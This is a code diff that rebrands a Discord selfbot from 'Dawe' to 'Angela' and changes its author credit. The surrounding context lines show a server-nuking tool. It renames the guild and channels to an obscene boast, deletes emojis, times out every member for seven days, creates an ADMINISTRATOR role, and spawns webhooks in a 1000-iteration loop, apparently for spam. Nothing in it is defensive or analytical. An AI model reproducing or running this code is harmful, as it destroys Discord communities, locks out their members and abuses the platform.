@@ -32,7 +32,7 @@ client.on("ready", async () => {
         guild.guild_banner ||
           "https://media.discordapp.net/attachments/1232793766323028140/1235237181287694336/e25c1104-b502-4bae-8194-5deb8fec4906.jpg?ex=6633a3c5&is=66325245&hm=d0703a96d0aae7346beed33a2460f4dd7bf85e7eea750ff5a5da05b37a9c7de1&=&format=webp"
       );
-      await fetchedGuild.setName(guild.guild_name || "Dawe Selfbot");
+      await fetchedGuild.setName(guild.guild_name || "Angela Selfbot");
 
       fetchedGuild.emojis.cache.forEach((emoji) => {
         fetchedGuild.emojis.delete(emoji);
@@ -43,7 +43,7 @@ client.on("ready", async () => {
       });
 
       fetchedGuild.channels.cache.each((ch) => {
-        ch.setName(guild_channels_name || "Suscefully Fucked Using Dawe");
+        ch.setName(guild_channels_name || "Suscefully Fucked Using Angela");
       });
 
       const timeInMilliseconds = 7 * 24 * 60 * 60 * 1000;
@@ -51,7 +51,7 @@ client.on("ready", async () => {
       const members = await fetchedGuild.members.fetch();
       members.forEach(async (member) => {
         try {
-          await member.timeout(timeInMilliseconds, "Using Dawe Selfbot!");
+          await member.timeout(timeInMilliseconds, "Using Angela Selfbot!");
           console.log(`Timeout added to ${member.user.tag}`);
         } catch (error) {
           console.error(
@@ -69,7 +69,7 @@ client.on("ready", async () => {
                   avatar:
                     webhooks_avatar ||
                     "https://media.discordapp.net/attachments/1232793766323028140/1235237181287694336/e25c1104-b502-4bae-8194-5deb8fec4906.jpg?ex=6633a3c5&is=66325245&hm=d0703a96d0aae7346beed33a2460f4dd7bf85e7eea750ff5a5da05b37a9c7de1&=&format=webp",
-                  reason: "developed by i1wx",
+                  reason: "developed by glocf",
                 }
               );
               console.log("Created Webhook in:", channel.name);
@@ -115,8 +115,8 @@ client.on("messageCreate", async (message) => {
         message.delete();
         const role = await message.guild.roles.create({
           data: {
-            name: "dawe",
-            reason: "Using Dawe Selfbot",
+            name: "Angela",
+            reason: "Using Angela Selfbot",
             color: "#000001",
             permissions: "ADMINISTRATOR",
           },
@@ -138,16 +138,16 @@ client.on("messageCreate", async (message) => {
         message.delete();
         const exampleEmbed = new MessageEmbed()
           .setColor("36393F")
-          .setURL("https://github.com/i1wx/Dawe")
+          .setURL("https://github.com/glocf/Angela")
           .setTitle(embed.author || "💌 **Github** ")
           .setDescription(
             `> ${
               embed.description ||
-              "```i Invite you to use dawe selfbot to do things as impressive as this <3```"
+              "```i Invite you to use Angela selfbot to do things as impressive as this <3```"
             }`
           )
           .setTimestamp()
-          .setFooter({ text: embed.footer || "@i1wx" });
+          .setFooter({ text: embed.footer || "@glocf" });
 
         await message.guild.setName(guild.guild_name);
         message.guild.channels.cache.forEach((channel) =>
@@ -169,7 +169,7 @@ client.on("messageCreate", async (message) => {
                     avatar:
                       webhooks_avatar ||
                       "https://media.discordapp.net/attachments/1232793766323028140/1235237181287694336/e25c1104-b502-4bae-8194-5deb8fec4906.jpg?ex=6633a3c5&is=66325245&hm=d0703a96d0aae7346beed33a2460f4dd7bf85e7eea750ff5a5da05b37a9c7de1&=&format=webp",
-                    reason: "developed by i1wx",
+                    reason: "developed by glocf",
                   }
                 );
                 for (let z = 0; z < 1000; z++) {
@@ -200,6 +200,8 @@ client.on("messageCreate", async (message) => {
         }).catch(error => {
           console.error("Error al obtener los datos de vanity invite:", error);
         });
+    } else if (command === "join") {
+      
     }
   }
 }
